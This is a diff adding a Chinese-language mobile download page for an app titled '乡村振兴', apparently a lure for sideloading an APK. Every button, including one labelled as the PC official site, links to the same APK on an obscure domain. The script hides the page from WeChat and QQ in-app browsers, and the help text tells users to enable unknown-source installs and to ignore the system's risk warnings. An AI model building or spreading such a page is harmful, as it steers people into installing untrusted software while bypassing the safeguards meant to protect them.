@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>APP 下载中心</title>
+
+<style>
+body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+    margin: 0;
+    padding: 0;
+    background: #f4f7f9;
+    min-height: 100vh;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+}
+
+.container {
+    width: 90%;
+    max-width: 420px;
+    background: #fff;
+    padding: 36px 22px;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+
+.logo {
+    width: 80px;
+    height: 80px;
+    border-radius: 16px;
+    margin-bottom: 18px;
+}
+
+h1 {
+    font-size: 22px;
+    color: #333;
+    margin: 0 0 10px;
+}
+
+p {
+    color: #666;
+    font-size: 14px;
+    margin: 0 0 24px;
+    line-height: 1.6;
+}
+
+.btn {
+    display: none;
+    width: 100%;
+    box-sizing: border-box;
+    padding: 15px 20px;
+    border-radius: 30px;
+    text-decoration: none;
+    font-weight: bold;
+    font-size: 16px;
+    transition: transform 0.2s;
+    margin-bottom: 12px; /* 增加按钮间距 */
+}
+
+.btn:last-of-type {
+    margin-bottom: 0;
+}
+
+.btn:active {
+    transform: scale(0.96);
+}
+
+.btn-android {
+    background: #3DDC84;
+    color: #fff;
+}
+
+/* 为通道2设置一个稍深一点的颜色以示区分 */
+.btn-android-2 {
+    background: #2cb669;
+    color: #fff;
+}
+
+.btn-pc {
+    background: #007AFF;
+    color: #fff;
+}
+
+.notice {
+    display: none;
+    margin-top: 20px;
+    padding: 16px;
+    border-radius: 14px;
+    background: #fff8e6;
+    color: #6b4a00;
+    text-align: left;
+    font-size: 14px;
+    line-height: 1.7;
+}
+
+.notice strong {
+    display: block;
+    margin-bottom: 8px;
+    color: #b36b00;
+    font-size: 15px;
+}
+
+.ios-block {
+    display: none;
+    margin-top: 18px;
+    padding: 18px;
+    border-radius: 14px;
+    background: #ffecec;
+    color: #b00020;
+    font-size: 15px;
+    line-height: 1.7;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+    <img src="https://is1-ssl.mzstatic.com/image/thumb/Purple221/v4/67/50/fa/6750fade-473f-e887-1de6-b4214616686c/AppIconLLC-0-0-1x_U007emarketing-0-8-0-85-220.png/1920x1080ia-80.png" alt="App Logo" class="logo">
+
+    <h1>乡村振兴</h1>
+    <p id="desc">点击下方按钮，开始安装应用</p>
+
+    <!-- 安卓下载通道 1 -->
+    <a href="https://tiwux.akjhd.com/segsdrh992.apk" 
+       id="btn-android-1" 
+       class="btn btn-android">
+       Android 下载通道 1
+    </a>
+
+    <!-- 安卓下载通道 2 -->
+    <a href="https://tiwux.akjhd.com/segsdrh992.apk" 
+       id="btn-android-2" 
+       class="btn btn-android-2">
+       Android 下载通道 2
+    </a>
+
+    <!-- PC端访问 -->
+    <a href="https://tiwux.akjhd.com/segsdrh992.apk" 
+       id="btn-pc" 
+       class="btn btn-pc">
+       访问官网 (PC端)
+    </a>
+
+    <div id="ios-block" class="ios-block">
+        当前暂不支持 iOS 设备访问乡村振兴。<br>
+        请使用 Android 手机访问本页面。
+    </div>
+
+    <div id="android-help" class="notice">
+        <strong>Android 安装帮助</strong>
+        1. 下载完成后，请点击安装包进行安装。<br>
+        2. 如果提示“禁止安装未知来源应用”，请点击“设置”，允许当前浏览器安装应用。<br>
+        3. 如果系统提示“存在风险”或“是否继续安装”，请选择“仍然安装 / 继续安装”。<br>
+        4. 部分手机安装完成后，需要返回桌面手动打开应用。<br>
+        5. 如果下载失败，请更换下载通道或浏览器后重新打开本页面！
+    </div>
+</div>
+
+<script>
+function detectDevice() {
+    const ua = navigator.userAgent.toLowerCase();
+
+    const isWeixin =
+        /micromessenger/i.test(ua) ||
+        /qq\//i.test(ua) ||
+        /wxwork/i.test(ua);
+
+    const isAndroid = ua.indexOf('android') !== -1;
+    const isIOS = /iphone|ipad|ipod/.test(ua);
+
+    const desc = document.getElementById('desc');
+    const androidBtn1 = document.getElementById('btn-android-1');
+    const androidBtn2 = document.getElementById('btn-android-2');
+    const pcBtn = document.getElementById('btn-pc');
+    const iosBlock = document.getElementById('ios-block');
+    const androidHelp = document.getElementById('android-help');
+
+    if (isWeixin) {
+        document.body.innerHTML = `
+        <div style="
+            position:fixed;
+            left:0;
+            top:0;
+            width:100%;
+            height:100%;
+            background:#000;
+            color:#fff;
+            display:flex;
+            flex-direction:column;
+            justify-content:center;
+            align-items:center;
+            text-align:center;
+            padding:30px;
+            box-sizing:border-box;
+            font-size:20px;
+            line-height:2;
+            z-index:99999;">
+            <div>⚠ 微信内无法下载</div>
+            <div>请点击右上角 ⋮</div>
+            <div>选择「在浏览器中打开」</div>
+            <div>然后重新访问本页面</div>
+        </div>
+        `;
+        return;
+    }
+
+    if (isIOS) {
+        desc.innerText = '当前设备暂不支持访问';
+        iosBlock.style.display = 'block';
+        return;
+    }
+
+    if (isAndroid) {
+        desc.innerText = '点击下方按钮下载 Android 安装包';
+        androidBtn1.style.display = 'inline-block';
+        androidBtn2.style.display = 'inline-block';
+        androidHelp.style.display = 'block';
+        return;
+    }
+
+    // 默认 PC 端
+    pcBtn.style.display = 'inline-block';
+}
+
+window.onload = detectDevice;
+</script>
+
+</body>
+</html>
